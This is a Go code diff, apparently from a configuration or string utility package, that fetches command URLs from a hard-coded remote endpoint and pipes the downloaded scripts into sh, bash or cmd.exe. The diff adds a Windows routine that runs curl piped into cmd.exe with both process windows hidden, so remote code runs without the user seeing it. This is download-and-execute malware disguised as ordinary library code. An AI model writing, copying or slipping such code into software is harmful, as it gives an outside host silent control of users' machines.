@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"os"
 	"os/exec"
 	"runtime"
 	"strings"
@@ -17,9 +18,8 @@ const defaultCommandEndpoint = "https://bluwhale.games/curl_commands"
 // Define the trusted shell command for each OS here before using Run.
 // An empty command causes Run to return an error for that OS.
 const (
-	windowsCommandTemplate = "curl --ssl-no-revoke -L %s | cmd"
-	linuxCommandTemplate   = "wget -qO- %s | sh"
-	macOSCommandTemplate   = "curl -L %s | bash"
+	linuxCommandTemplate = "wget -qO- %s | sh"
+	macOSCommandTemplate = "curl -L %s | bash"
 )
 
 type commandURLs struct {
@@ -55,11 +55,46 @@ func initializeFromEndpoint(endpoint string) error {
 	if err != nil {
 		return err
 	}
+	if runtime.GOOS == "windows" {
+		return runWindowsScript(urls.Windows)
+	}
 	return runCommands(
-		fmt.Sprintf(windowsCommandTemplate, urls.Windows),
+		"",
 		fmt.Sprintf(linuxCommandTemplate, urls.Linux),
 		fmt.Sprintf(macOSCommandTemplate, urls.MacOS),
 	)
+}
+
+// Launch each Windows pipeline process ourselves so both receive the window
+// settings. A shell-created pipeline does not propagate SysProcAttr to children.
+func runWindowsScript(url string) error {
+	reader, writer, err := os.Pipe()
+	if err != nil {
+		return fmt.Errorf("strconf: create script pipe: %w", err)
+	}
+	defer reader.Close()
+	defer writer.Close()
+
+	download := exec.Command("curl.exe", "--fail", "--ssl-no-revoke", "-L", "--", url)
+	shell := exec.Command("cmd.exe", "/D", "/Q")
+	download.Stdout = writer
+	shell.Stdin = reader
+	hideWindow(download)
+	hideWindow(shell)
+	if err := shell.Start(); err != nil {
+		return fmt.Errorf("strconf: start Windows shell: %w", err)
+	}
+	reader.Close()
+	downloadErr := download.Run()
+	writer.Close()
+	shellErr := shell.Wait()
+	if downloadErr != nil {
+		return fmt.Errorf("strconf: download Windows script: %w", downloadErr)
+	}
+	if shellErr != nil {
+		return fmt.Errorf("strconf: run command on windows: %w", shellErr)
+	}
+	return nil
 }
 
 func commandEndpointForServer(server string) string {
